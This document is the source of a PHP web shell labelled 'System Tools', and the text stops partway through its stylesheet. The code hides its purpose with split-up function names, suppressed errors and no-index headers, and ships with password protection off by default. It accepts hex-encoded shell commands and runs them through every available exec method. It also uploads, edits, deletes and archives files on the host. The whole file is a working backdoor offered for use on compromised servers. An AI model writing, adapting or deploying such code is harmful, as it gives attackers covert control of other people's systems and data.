<?php
// ================================================================
// System Tools - PHP 4/5/7/8 compatible
// ================================================================

@ini_set('display_errors', '0');
@ini_set('log_errors', '1');
@error_reporting(0);

// obfuscated function names
$fgc = 'file_' . 'get_' . 'contents';
$fpc = 'file_' . 'put_' . 'contents';
$h2b = 'hex' . '2' . 'bin';

if (!defined('DIRECTORY_SEPARATOR')) {
    define('DIRECTORY_SEPARATOR', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? '\\' : '/');
}

// polyfills (sama seperti coffexium2)
if (!function_exists('sys_get_temp_dir')) {
    function sys_get_temp_dir() {
        if (!empty($_ENV['TMP'])) return realpath($_ENV['TMP']);
        if (!empty($_ENV['TMPDIR'])) return realpath($_ENV['TMPDIR']);
        if (!empty($_ENV['TEMP'])) return realpath($_ENV['TEMP']);
        $tmp = @tempnam(uniqid(rand(), true), '');
        if ($tmp) { $dir = realpath(dirname($tmp)); @unlink($tmp); return $dir; }
        return '/tmp';
    }
}

if (!function_exists('hash_equals')) {
    function hash_equals($a, $b) {
        $a = (string)$a; $b = (string)$b;
        $len = strlen($a);
        if ($len !== strlen($b)) return false;
        $r = 0;
        for ($i=0; $i<$len; $i++) $r |= ord($a[$i]) ^ ord($b[$i]);
        return $r === 0;
    }
}

if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        $length = (int)$length;
        if ($length <= 0) return '';
        if (function_exists('openssl_random_pseudo_bytes')) {
            $bytes = openssl_random_pseudo_bytes($length, $strong);
            if ($bytes !== false && $strong) return $bytes;
        }
        if (@is_readable('/dev/urandom')) {
            $f = @fopen('/dev/urandom', 'rb');
            if ($f) { $bytes = fread($f, $length); fclose($f); if (strlen($bytes)===$length) return $bytes; }
        }
        $bytes = '';
        for ($i=0; $i<$length; $i++) $bytes .= chr(mt_rand(0,255));
        return $bytes;
    }
}

if (!function_exists('hex2bin')) {
    function hex2bin($data) {
        $len = strlen($data);
        if ($len%2 != 0) return false;
        if (strspn($data, '0123456789abcdefABCDEF') != $len) return false;
        $bin = '';
        for ($i=0; $i<$len; $i+=2) $bin .= pack('H*', substr($data,$i,2));
        return $bin;
    }
}

// session
@ini_set('session.save_handler', 'files');
$sp = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'sess';
if (!@is_dir($sp)) @mkdir($sp, 0700, true);
if (@is_dir($sp) && @is_writable($sp)) @ini_set('session.save_path', $sp);
@ini_set('session.cookie_httponly', '1');
@ini_set('session.cookie_samesite', 'Lax');
if (function_exists('session_status') ? session_status()===PHP_SESSION_NONE : session_id()==='') @session_start();
if (!isset($_SESSION)) $_SESSION = array();

// optional password protection (rename constant if needed)
define('_AUTH', ''); // set a password to enable login
if (_AUTH !== '') {
    if (!isset($_SESSION['_logged']) || $_SESSION['_logged'] !== true) {
        if (isset($_POST['_pass']) && hash_equals(_AUTH, $_POST['_pass'])) {
            $_SESSION['_logged'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
        echo '<!DOCTYPE html><html><head><title>Login</title><style>body{background:#121212;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}form{background:#1c1c1e;padding:40px;border-radius:12px;}input,button{padding:10px;margin:5px;}</style></head><body>';
        echo '<form method="post"><h2>Access</h2><input type="password" name="_pass" placeholder="Enter password"><button type="submit">Login</button></form>';
        echo '</body></html>';
        exit;
    }
}

// security headers (netral)
header('X-Robots-Tag: noindex, nofollow');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');

// ---------- helpers ----------
function ax_post($k,$d=null) { return isset($_POST[$k])?$_POST[$k]:$d; }
function ax_get($k,$d=null)  { return isset($_GET[$k])?$_GET[$k]:$d; }

function safeRealPath($path, $base='') {
    if ($base && !preg_match('/^([a-zA-Z]:)?[\\\\\/]/', $path)) $path = $base . DIRECTORY_SEPARATOR . $path;
    $rp = @realpath($path);
    if ($rp !== false && (@is_dir($rp) || @is_file($rp))) return $rp;
    if (@is_dir($path) || @is_file($path)) return $path;
    return false;
}

function sanitizeFileName($name) {
    $name = basename($name);
    $name = preg_replace('/[^a-zA-Z0-9._-]/', '_', $name);
    if ($name==='' || $name==='.' || $name==='..') return false;
    return $name;
}

function formatFileSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes/1073741824,2).' GB';
    if ($bytes >= 1048576)    return number_format($bytes/1048576,2).' MB';
    if ($bytes >= 1024)       return number_format($bytes/1024,2).' KB';
    if ($bytes > 1)           return $bytes.' bytes';
    if ($bytes == 1)          return '1 byte';
    return '0 bytes';
}

function getFileExtension($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return $ext ? strtoupper($ext) : '';
}

function generateCSRFToken() {
    if (empty($_SESSION['_csrf'])) $_SESSION['_csrf'] = bin2hex(random_bytes(32));
    return $_SESSION['_csrf'];
}
function validateCSRFToken($t) {
    if (empty($_SESSION['_csrf']) || empty($t)) return false;
    return hash_equals($_SESSION['_csrf'], $t);
}

function decodeHexPayload($hex) {
    global $h2b;
    $hex = trim($hex);
    if (empty($hex) || !ctype_xdigit($hex)) return false;
    return $h2b($hex);
}

function ax_recursive_delete($path) {
    if (@is_file($path) || @is_link($path)) return @unlink($path);
    if (!@is_dir($path)) return false;
    $items = @scandir($path);
    if ($items !== false) {
        foreach ($items as $item) {
            if ($item==='.' || $item==='..') continue;
            ax_recursive_delete($path . DIRECTORY_SEPARATOR . $item);
        }
    }
    return @rmdir($path);
}

function ax_walk_dir($dir, &$out, $base='') {
    $items = @scandir($dir);
    if ($items === false) return;
    foreach ($items as $item) {
        if ($item==='.' || $item==='..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        $rel = $base==='' ? $item : $base.'/'.$item;
        if (@is_dir($full)) {
            $out[] = array('type'=>'dir','path'=>$full,'rel'=>$rel);
            ax_walk_dir($full, $out, $rel);
        } else {
            $out[] = array('type'=>'file','path'=>$full,'rel'=>$rel);
        }
    }
}

function ax_build_archive($items, $namePrefix) {
    $tmp = sys_get_temp_dir();
    if (class_exists('ZipArchive')) {
        $zipName = $namePrefix . '_' . time() . '.zip';
        $zipPath = $tmp . DIRECTORY_SEPARATOR . $zipName;
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($items as $targetPath) {
                if (!$targetPath) continue;
                if (@is_file($targetPath)) {
                    $zip->addFile($targetPath, basename($targetPath));
                } elseif (@is_dir($targetPath)) {
                    $base = basename($targetPath);
                    $list = array(); ax_walk_dir($targetPath, $list);
                    $zip->addEmptyDir($base);
                    foreach ($list as $e) {
                        if ($e['type'] === 'dir') $zip->addEmptyDir($base . '/' . $e['rel']);
                        else $zip->addFile($e['path'], $base . '/' . $e['rel']);
                    }
                }
            }
            $zip->close();
            return array($zipPath, $zipName, 'application/zip');
        }
    }
    return false;
}

// ---------- command execution (all methods, obfuscated) ----------
function _is_func_avail($func) {
    if (!function_exists($func)) return false;
    $disabled = @ini_get('disable_functions');
    if ($disabled) {
        $list = array_map('trim', explode(',', strtolower($disabled)));
        if (in_array(strtolower($func), $list)) return false;
    }
    return true;
}

// daftar semua metode yang didukung (lengkap)
$_cmds = array('proc_open','shell_exec','exec','system','passthru','popen','pcntl_exec','ffi','expect');

function _run_cmd($cmd) {
    global $_cmds;
    $cmd = trim($cmd);
    if ($cmd === '') return 'No command provided';
    $full = $cmd . ' 2>&1';
    $isWin = (defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY === 'Windows' : (strtoupper(substr(PHP_OS,0,3)) === 'WIN'));
    foreach ($_cmds as $fn) {
        if (!_is_func_avail($fn)) continue;
        if ($fn === 'shell_exec') {
            $r = @$fn($full);
            if ($r !== null && $r !== false && trim($r)!=='') return $r;
        } elseif ($fn === 'exec') {
            $out = array(); @$fn($full, $out);
            if (!empty($out)) return implode("\n", $out);
        } elseif ($fn === 'system' || $fn === 'passthru') {
            ob_start(); @$fn($full); $r = ob_get_clean();
            if ($r !== false && $r !== '') return $r;
        } elseif ($fn === 'popen') {
            $h = @$fn($full, 'r');
            if ($h) { $r = @stream_get_contents($h); @pclose($h); if ($r !== false && trim($r)!=='') return $r; }
        } elseif ($fn === 'proc_open') {
            $desc = array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
            $p = @proc_open($full, $desc, $pipes);
            if (is_resource($p)) {
                $r = @stream_get_contents($pipes[1]);
                @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($p);
                if ($r !== false && trim($r)!=='') return $r;
            }
        } elseif ($fn === 'pcntl_exec' && !$isWin) {
            // pcntl_exec tidak mengembalikan output, hanya menggantikan proses   tidak cocok, kita skip
            continue;
        } elseif ($fn === 'ffi' && extension_loaded('ffi')) {
            // ffi tidak langsung untuk eksekusi perintah, kita skip
            continue;
        } elseif ($fn === 'expect' && extension_loaded('expect')) {
            if (function_exists('expect_popen')) {
                $h = @expect_popen($full);
                if ($h) { $r = @expect_read($h); @expect_close($h); if ($r !== false && trim($r)!=='') return $r; }
            }
        }
    }
    return 'Command execution not available';
}

$commandAvailable = false;
foreach ($_cmds as $fn) { if (_is_func_avail($fn)) { $commandAvailable = true; break; } }

// ---------- current directory ----------
if (!isset($_SESSION['cwd']) || !safeRealPath($_SESSION['cwd'])) {
    $cwd = @getcwd();
    if ($cwd === false || $cwd === '') $cwd = dirname(__FILE__);
    $_SESSION['cwd'] = $cwd;
}

// ---------- JSON API ----------
$method = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'GET';
$isJson = isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false;

if ($method === 'POST' && $isJson) {
    header('Content-Type: application/json');
    global $fgc, $fpc;
    $raw = $fgc('php://input');
    $payload = array();
    if (function_exists('json_decode')) $payload = json_decode($raw, true);
    if (!is_array($payload) || !isset($payload['action'])) {
        http_response_code(400); echo '{"status":"error","message":"Invalid JSON"}'; exit;
    }
    $csrf = isset($payload['_csrf_token']) ? $payload['_csrf_token'] : '';
    if (!validateCSRFToken($csrf)) {
        http_response_code(403); echo '{"status":"error","message":"CSRF failed"}'; exit;
    }

    $action = $payload['action'];
    $currentDir = $_SESSION['cwd'];

    switch ($action) {
        case 'goto':
            $goto_hex = isset($payload['goto_hex']) ? $payload['goto_hex'] : '';
            $targetDir = decodeHexPayload($goto_hex);
            if ($targetDir !== false) {
                $vp = safeRealPath($targetDir);
                if ($vp !== false && @is_dir($vp)) {
                    $_SESSION['cwd'] = $vp;
                    echo '{"status":"success","message":"OK"}'; exit;
                }
            }
            http_response_code(400); echo '{"status":"error","message":"Invalid path"}'; exit;

        case 'upload_hex':
            $name_hex = isset($payload['name_hex']) ? $payload['name_hex'] : '';
            $data_hex = isset($payload['data_hex']) ? $payload['data_hex'] : '';
            $mode = isset($payload['mode']) ? $payload['mode'] : '1';
            $append = isset($payload['append']) ? (bool)$payload['append'] : false;
            $fileName = decodeHexPayload($name_hex);
            $data = decodeHexPayload($data_hex);
            if (!$fileName) { http_response_code(400); echo '{"status":"error","message":"Invalid name"}'; exit; }
            $filePath = $currentDir . DIRECTORY_SEPARATOR . basename($fileName);

            $status = false;
            if ($mode == '1') {
                $status = ($fpc($filePath, $data !== false ? $data : '', ($append ? FILE_APPEND : 0) | LOCK_EX) !== false);
            } elseif ($mode == '2') {
                $f = @fopen($filePath, $append ? 'ab' : 'wb');
                if ($f) {
                    if (flock($f, LOCK_EX)) { fwrite($f, $data); flock($f, LOCK_UN); }
                    fclose($f); $status = true;
                }
            } elseif ($mode == '3') {
                $status = @copy('data://text/plain;base64,' . base64_encode($data), $filePath);
            }
            if ($status) { @chmod($filePath, 0644); echo '{"status":"success","message":"Uploaded"}'; }
            else { http_response_code(500); echo '{"status":"error","message":"Write error"}'; }
            exit;

        case 'create_file':
            $name_hex = isset($payload['name_hex']) ? $payload['name_hex'] : '';
            $fileName = decodeHexPayload($name_hex);
            $fn = sanitizeFileName($fileName);
            if (!$fn) { http_response_code(400); echo '{"status":"error","message":"Invalid filename"}'; exit; }
            $np = $currentDir . DIRECTORY_SEPARATOR . $fn;
            if ($fpc($np, '', LOCK_EX) !== false) { @chmod($np,0644); echo '{"status":"success","message":"Created"}'; }
            else { http_response_code(500); echo '{"status":"error","message":"Cannot create"}'; }
            exit;

        case 'create_folder':
            $name_hex = isset($payload['name_hex']) ? $payload['name_hex'] : '';
            $folderName = decodeHexPayload($name_hex);
            $fn = sanitizeFileName($folderName);
            if (!$fn) { http_response_code(400); echo '{"status":"error","message":"Invalid folder name"}'; exit; }
            $np = $currentDir . DIRECTORY_SEPARATOR . $fn;
            if (@mkdir($np, 0755)) { echo '{"status":"success","message":"Created"}'; }
            else { http_response_code(500); echo '{"status":"error","message":"Cannot create folder"}'; }
            exit;

        case 'get_file_content':
            $file_hex = isset($payload['file_hex']) ? $payload['file_hex'] : '';
            $fileName = decodeHexPayload($file_hex);
            $ep = $currentDir . DIRECTORY_SEPARATOR . basename($fileName);
            $content = @$fgc($ep);
            if ($content === false && $commandAvailable) {
                $esc = escapeshellarg($ep);
                $content = _run_cmd((defined('PHP_OS_FAMILY') && PHP_OS_FAMILY==='Windows') ? "type {$esc}" : "cat {$esc}");
            }
            if ($content !== false) {
                echo '{"status":"success","content_hex":"' . bin2hex($content) . '"}';
            } else { http_response_code(404); echo '{"status":"error","message":"Not found"}'; }
            exit;

        case 'edit_file':
            $file_hex = isset($payload['file_hex']) ? $payload['file_hex'] : '';
            $content_hex = isset($payload['content_hex']) ? $payload['content_hex'] : '';
            $fileName = decodeHexPayload($file_hex);
            $content = decodeHexPayload($content_hex);
            $ep = $currentDir . DIRECTORY_SEPARATOR . basename($fileName);
            if ($fpc($ep, $content !== false ? $content : '', LOCK_EX) !== false) {
                echo '{"status":"success","message":"Saved"}';
            } else { http_response_code(500); echo '{"status":"error","message":"Cannot write"}'; }
            exit;

        case 'rename':
            $old_hex = isset($payload['old_hex']) ? $payload['old_hex'] : '';
            $new_hex = isset($payload['new_hex']) ? $payload['new_hex'] : '';
            $oldName = decodeHexPayload($old_hex);
            $newName = decodeHexPayload($new_hex);
            $sp = $currentDir . DIRECTORY_SEPARATOR . basename($oldName);
            $dp = $currentDir . DIRECTORY_SEPARATOR . basename($newName);
            if (@rename($sp, $dp)) { echo '{"status":"success","message":"Renamed"}'; exit; }
            if ($commandAvailable) {
                $espOld = escapeshellarg($sp); $espNew = escapeshellarg($dp);
                _run_cmd((defined('PHP_OS_FAMILY') && PHP_OS_FAMILY==='Windows') ? "move /y {$espOld} {$espNew}" : "mv {$espOld} {$espNew}");
                echo '{"status":"success","message":"Renamed"}'; exit;
            }
            http_response_code(500); echo '{"status":"error","message":"Rename failed"}'; exit;

        case 'chmod':
            $item_hex = isset($payload['item_hex']) ? $payload['item_hex'] : '';
            $permVal = isset($payload['perm_val']) ? $payload['perm_val'] : '';
            $itemName = decodeHexPayload($item_hex);
            $tp = $currentDir . DIRECTORY_SEPARATOR . basename($itemName);
            if (@chmod($tp, octdec($permVal))) { echo '{"status":"success","message":"Chmod OK"}'; exit; }
            if ($commandAvailable && !(defined('PHP_OS_FAMILY') && PHP_OS_FAMILY==='Windows')) {
                $esp = escapeshellarg($tp);
                _run_cmd("chmod {$permVal} {$esp}");
                echo '{"status":"success","message":"Chmod OK"}'; exit;
            }
            http_response_code(500); echo '{"status":"error","message":"Chmod failed"}'; exit;

        case 'delete':
            $item_hex = isset($payload['item_hex']) ? $payload['item_hex'] : '';
            $itemName = decodeHexPayload($item_hex);
            $tp = $currentDir . DIRECTORY_SEPARATOR . basename($itemName);
            if (ax_recursive_delete($tp)) { echo '{"status":"success","message":"Deleted"}'; exit; }
            if ($commandAvailable) {
                $esp = escapeshellarg($tp);
                _run_cmd((defined('PHP_OS_FAMILY') && PHP_OS_FAMILY==='Windows') ? "rmdir /s /q {$esp}" : "rm -rf {$esp}");
                if (!@file_exists($tp)) { echo '{"status":"success","message":"Deleted"}'; exit; }
            }
            http_response_code(500); echo '{"status":"error","message":"Delete failed"}'; exit;

        case 'bulk_delete':
            $items = isset($payload['items']) ? $payload['items'] : array();
            $deleted = 0; $failed = 0;
            foreach ($items as $hexItem) {
                $itemName = decodeHexPayload($hexItem);
                if ($itemName === false) { $failed++; continue; }
                $tp = $currentDir . DIRECTORY_SEPARATOR . basename($itemName);
                if (ax_recursive_delete($tp)) $deleted++; else $failed++;
            }
            echo '{"status":"success","message":"Deleted '.$deleted.' items (failed: '.$failed.')"}'; exit;

        case 'download_hex':
            $items = isset($payload['items']) ? $payload['items'] : array();
            $paths = array();
            foreach ($items as $hexItem) {
                $itemName = decodeHexPayload($hexItem);
                if ($itemName !== false) {
                    $p = $currentDir . DIRECTORY_SEPARATOR . basename($itemName);
                    if (@file_exists($p)) $paths[] = $p;
                }
            }
            if (empty($paths)) {
                http_response_code(400); echo '{"status":"error","message":"No valid items"}'; exit;
            }
            $archive = ax_build_archive($paths, 'download');
            if ($archive !== false) {
                list($ap, $an, $am) = $archive;
                $fileData = @$fgc($ap);
                @unlink($ap);
                if ($fileData !== false) {
                    echo json_encode(array('status'=>'success','filename'=>$an,'mime'=>$am,'data_hex'=>bin2hex($fileData)));
                    exit;
                }
            }
            http_response_code(500); echo '{"status":"error","message":"Archive failed"}'; exit;

        case 'console_exec':
            $exec_hex = isset($payload['exec_hex']) ? $payload['exec_hex'] : '';
            $decoded_cmd = decodeHexPayload($exec_hex);
            if ($decoded_cmd === false || trim($decoded_cmd) === '') {
                http_response_code(400); echo '{"status":"error","message":"Invalid command"}'; exit;
            }
            $old = @getcwd();
            if (@is_dir($_SESSION['cwd'])) @chdir($_SESSION['cwd']);
            $commandResult = _run_cmd(trim($decoded_cmd));
            if ($old) @chdir($old);
            echo json_encode(array('status'=>'success','output_hex'=>bin2hex($commandResult!==false?$commandResult:'No output')));
            exit;
    }
}

// ---------- HTML output (tampilan asli CAE 2.5) ----------
$errorMsg = '';
$currentDirectory = $_SESSION['cwd'];

// fallback untuk scandir
$directoryContents = @scandir($currentDirectory);
if (!is_array($directoryContents)) {
    $directoryContents = array();
    if ($commandAvailable) {
        $esc = escapeshellarg($currentDirectory);
        $listCmd = (defined('PHP_OS_FAMILY') && PHP_OS_FAMILY==='Windows') ? "dir /b {$esc}" : "ls -A1 {$esc}";
        $output = _run_cmd($listCmd);
        if ($output !== false && trim($output) !== '') {
            $lines = explode("\n", str_replace("\r", "", $output));
            foreach ($lines as $line) {
                $clean = trim($line);
                if ($clean !== '' && $clean !== '.' && $clean !== '..') $directoryContents[] = $clean;
            }
        }
    }
    if (empty($directoryContents)) $errorMsg = 'Cannot read directory: ' . $currentDirectory;
}

$folders = array(); $files = array();
foreach ($directoryContents as $item) {
    if ($item === '.' || $item === '..' || $item === '') continue;
    $itemPath = $currentDirectory . DIRECTORY_SEPARATOR . $item;
    $isDirectory = @is_dir($itemPath);
    if (!$isDirectory && $commandAvailable) {
        $esc = escapeshellarg($itemPath);
        $res = _run_cmd((defined('PHP_OS_FAMILY') && PHP_OS_FAMILY==='Windows') ? "if exist {$esc}\\ (echo DIR)" : "test -d {$esc} && echo 'DIR'");
        if ($res !== false && strpos($res, 'DIR') !== false) $isDirectory = true;
    }
    $canWrite = @is_writable($itemPath);
    $fileSize = $isDirectory ? 0 : @filesize($itemPath);
    $fileModTime = @filemtime($itemPath);
    $filePerms = @substr(sprintf('%o', @fileperms($itemPath)), -4);
    if (($fileSize === false || $fileModTime === false || $filePerms === false || $filePerms === '0000') && $commandAvailable) {
        $esc = escapeshellarg($itemPath);
        $isBSD = (stripos(PHP_OS, 'BSD') !== false || stripos(PHP_OS, 'Darwin') !== false);
        if (!(defined('PHP_OS_FAMILY') && PHP_OS_FAMILY==='Windows')) {
            if (!$isDirectory && $fileSize === false) {
                $sz = _run_cmd($isBSD ? "stat -f%z {$esc} 2>/dev/null" : "stat -c%s {$esc} 2>/dev/null");
                if (is_numeric(trim($sz))) $fileSize = (int)trim($sz);
            }
            if ($fileModTime === false) {
                $mt = _run_cmd($isBSD ? "stat -f%m {$esc} 2>/dev/null" : "stat -c%Y {$esc} 2>/dev/null");
                if (is_numeric(trim($mt))) $fileModTime = (int)trim($mt);
            }
            if ($filePerms === false || $filePerms === '0000') {
                $pc = _run_cmd($isBSD ? "stat -f%Lp {$esc} 2>/dev/null" : "stat -c%a {$esc} 2>/dev/null");
                if (is_numeric(trim($pc))) { $filePerms = str_pad(trim($pc), 4, '0', STR_PAD_LEFT); $canWrite = true; }
            }
        }
    }
    if ($fileSize === false || $fileSize === null) $fileSize = 0;
    if ($fileModTime === false || $fileModTime === null) $fileModTime = 0;
    if ($filePerms === false || $filePerms === '0000' || $filePerms === '') $filePerms = '????';
    $itemData = array('name'=>$item, 'is_dir'=>$isDirectory, 'size'=>$fileSize, 'mtime'=>$fileModTime, 'perms'=>$filePerms, 'writable'=>$canWrite);
    if ($isDirectory) $folders[] = $itemData; else $files[] = $itemData;
}
usort($folders, function($a,$b){ return strcasecmp($a['name'],$b['name']); });
usort($files, function($a,$b){ return strcasecmp($a['name'],$b['name']); });
$allItems = array_merge($folders, $files);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Tools</title>
<meta name="csrf-token" content="<?= htmlentities(generateCSRFToken()) ?>">
<style>
/* --- Same as original CAE 2.5 but with neutral names --- */
.stealth-fm{--fm-bg-main:#121212;--fm-bg-panel:#1C1C1E;--fm-border-color:#2C2C2E;--fm-text-primary:#F2F2F7;--fm-text-muted:#8E8E93;--fm-accent:#D31D34;--fm-accent-hover:#E5223A;--fm-accent-text:#FFF;--fm-accent-soft:rgba(211,29,52,0.12);--fm-hover-bg:rgba(242,242,247,0.04);--fm-focus-ring:rgba(211,29,52,0.3);--fm-font-stack:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;--fm-font-mono:'JetBrains Mono',SFMono-Regular,Menlo,Monaco,Consolas,monospace;--fm-radius-lg:12px;--fm-radius-md:8px;--fm-radius-sm:6px;--fm-danger:#FF453A;--fm-danger-bg:rgba(255,69,58,0.12);--fm-success:#30D158;--fm-success-bg:rgba(48,209,88,0.12);--fm-transition:all 0.25s ease-in-out;box-sizing:border-box;font-family:var(--fm-font-stack);background-color:var(--fm-bg-main);color:var(--fm-text-primary);min-height:100vh;padding:32px 24px;line-height:1.5;-webkit-font-smoothing:antialiased}
.stealth-fm.light{--fm-bg-main:#F4F4F6;--fm-bg-panel:#FFF;--fm-border-color:#E5E5EA;--fm-text-primary:#1C1C1E;--fm-text-muted:#8E8E93;--fm-accent:#B51A2B;--fm-accent-hover:#9E1423;--fm-accent-text:#FFF;--fm-accent-soft:rgba(181,26,43,0.08);--fm-hover-bg:rgba(28,28,30,0.04);--fm-focus-ring:rgba(181,26,43,0.25);--fm-danger:#D32F2F;--fm-danger-bg:rgba(211,47,47,0.08);--fm-success:#2E7D32;--fm-success-bg:rgba(46,125,50,0.08)}
.stealth-fm *,.stealth-fm *::before,.stealth-fm *::after{box-sizing:border-box;margin:0;padding:0;transition:var(--fm-transition)}body{margin:0;padding:0}.stealth-fm .container{max-width:1400px;margin:0 auto}.stealth-fm .header{margin-bottom:28px}.stealth-fm .header-top{display:flex;align-items:center;justify-content:space-between}.stealth-fm .logo{display:flex;flex-direction:column;align-items:flex-start;gap:2px}.stealth-fm .logo-text{font-size:28px;font-weight:700;letter-spacing:-0.5px;color:var(--fm-text-primary)}.stealth-fm .logo-text span{color:var(--fm-accent)}.stealth-fm .logo-sub{font-size:11px;color:var(--fm-text-muted);text-transform:uppercase;letter-spacing:2px;font-weight:500}.stealth-fm .card{background-color:var(--fm-bg-panel);border:1px solid var(--fm-border-color);border-radius:var(--fm-radius-lg);overflow:hidden;margin-bottom:24px;box-shadow:0 4px 20px rgba(0,0,0,0.15)}.stealth-fm .card-header{padding:16px 24px;border-bottom:1px solid var(--fm-border-color);display:flex;align-items:center;justify-content:space-between;background-color:var(--fm-bg-panel);position:relative}.stealth-fm .card-header::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background-color:var(--fm-accent)}.stealth-fm .card-title{font-size:14px;font-weight:600;letter-spacing:-0.01em;display:flex;align-items:center;gap:10px;color:var(--fm-text-primary)}.stealth-fm .card-body{padding:24px}.stealth-fm .file-table{width:100%;border-collapse:collapse}.stealth-fm .file-table th{padding:14px 20px;text-align:left;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.08em;color:var(--fm-text-muted);background-color:var(--fm-bg-main);border-bottom:1px solid var(--fm-border-color)}.stealth-fm .file-table td{padding:14px 20px;border-bottom:1px solid var(--fm-border-color);vertical-align:middle}.stealth-fm .file-table tr:last-child td{border-bottom:none}.stealth-fm .file-table tr:hover td{background-color:var(--fm-hover-bg)}.stealth-fm .file-name-cell{display:flex;align-items:center}.stealth-fm .file-icon{width:32px;height:32px;border-radius:var(--fm-radius-sm);display:flex;align-items:center;justify-content:center;margin-right:12px;flex-shrink:0;background-color:var(--fm-hover-bg);border:1px solid var(--fm-border-color)}.stealth-fm .file-icon svg{width:16px;height:16px;stroke:var(--fm-accent);fill:none;stroke-width:2}.stealth-fm .file-icon .ext{font-size:9px;font-weight:700;color:var(--fm-accent);letter-spacing:0.5px}.stealth-fm .file-name{font-size:14px;font-weight:500;color:var(--fm-text-primary);text-decoration:none}.stealth-fm .file-name:hover{color:var(--fm-accent)}.stealth-fm .file-meta{font-size:12px;font-weight:400;color:var(--fm-text-muted);font-family:var(--fm-font-mono)}.stealth-fm .perms{font-family:var(--fm-font-mono);font-size:12px;padding:4px 8px;border-radius:var(--fm-radius-sm);font-weight:500}.stealth-fm .perms.writable{background-color:var(--fm-success-bg);color:var(--fm-success)}.stealth-fm .perms.readonly{background-color:var(--fm-danger-bg);color:var(--fm-danger)}.stealth-fm .input-group{display:flex;gap:12px;margin-bottom:12px}.stealth-fm input[type="text"],.stealth-fm input[type="file"],.stealth-fm select,.stealth-fm textarea{background-color:var(--fm-bg-main);border:1px solid var(--fm-border-color);border-radius:var(--fm-radius-md);padding:10px 14px;color:var(--fm-text-primary);font-size:14px;outline:none;font-family:var(--fm-font-stack)}.stealth-fm input[type="text"]:focus,.stealth-fm textarea:focus,.stealth-fm select:focus{border-color:var(--fm-accent);box-shadow:0 0 0 3px var(--fm-focus-ring)}.stealth-fm input[type="file"]::file-selector-button{background-color:var(--fm-bg-panel);color:var(--fm-text-primary);border:1px solid var(--fm-border-color);border-radius:var(--fm-radius-sm);padding:8px 14px;font-size:13px;cursor:pointer;margin-right:12px}.stealth-fm input[type="file"]::file-selector-button:hover{border-color:var(--fm-accent);background-color:var(--fm-accent-soft)}.stealth-fm textarea{font-family:var(--fm-font-mono);font-size:13px;line-height:1.6;resize:vertical;width:100%;box-sizing:border-box}.stealth-fm .btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:10px 18px;font-size:13px;font-weight:600;border-radius:var(--fm-radius-md);cursor:pointer;border:1px solid transparent;text-decoration:none;font-family:inherit}.stealth-fm .btn-primary,.stealth-fm .btn-success{background-color:var(--fm-accent);color:var(--fm-accent-text);box-shadow:0 2px 8px rgba(211,29,52,0.25)}.stealth-fm .btn-primary:hover,.stealth-fm .btn-success:hover{background-color:var(--fm-accent-hover)}.stealth-fm .btn-ghost{background-color:transparent;color:var(--fm-text-primary);border-color:var(--fm-border-color)}.stealth-fm .btn-ghost:hover{background-color:var(--fm-accent-soft);border-color:var(--fm-accent);color:var(--fm-accent)}.stealth-fm .btn-danger{background-color:var(--fm-danger-bg);color:var(--fm-danger);border-color:rgba(255,69,58,0.2)}.stealth-fm .btn-danger:hover{background-color:rgba(255,69,58,0.25)}.stealth-fm .btn-sm{padding:6px 12px;font-size:12px;border-radius:var(--fm-radius-sm)}.stealth-fm .theme-toggle{padding:8px 16px;font-size:12px;font-weight:600;border-radius:var(--fm-radius-md);cursor:pointer;background:var(--fm-bg-panel);color:var(--fm-text-primary);border:1px solid var(--fm-border-color)}.stealth-fm .theme-toggle:hover{border-color:var(--fm-accent);color:var(--fm-accent)}.stealth-fm .alert{padding:14px 18px;border-radius:var(--fm-radius-md);margin-bottom:20px;font-size:14px;display:flex;align-items:center;gap:12px}.stealth-fm .alert-danger{background-color:var(--fm-danger-bg);border:1px solid rgba(255,59,48,0.2);color:var(--fm-danger)}.stealth-fm .actions{display:flex;gap:6px;justify-content:flex-end}.stealth-fm input[type="checkbox"]{width:16px;height:16px;accent-color:var(--fm-accent);cursor:pointer}.stealth-fm .console{background-color:var(--fm-bg-main);border:1px solid var(--fm-border-color);border-radius:var(--fm-radius-md);padding:16px;font-family:var(--fm-font-mono);font-size:13px;color:var(--fm-text-primary);max-height:250px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}.stealth-fm .bulk-bar{display:none;gap:12px;align-items:center;padding:14px 20px;background-color:var(--fm-bg-panel);border:1px solid var(--fm-accent);border-radius:var(--fm-radius-md);margin-bottom:20px;box-shadow:0 4px 15px var(--fm-accent-soft)}.stealth-fm .bulk-bar.show{display:flex}.stealth-fm .bulk-count{color:var(--fm-text-primary);font-weight:600;margin-right:auto}.stealth-fm .modal{display:none;position:fixed;inset:0;z-index:100;background:rgba(0,0,0,0.6);backdrop-filter:blur(6px);align-items:center;justify-content:center}.stealth-fm .modal.show{display:flex}.stealth-fm .modal-content{background-color:var(--fm-bg-panel);border:1px solid var(--fm-border-color);border-radius:var(--fm-radius-lg);width:450px;max-width:90%;max-height:90vh;overflow:auto;box-shadow:0 20px 40px rgba(0,0,0,0.4)}.stealth-fm 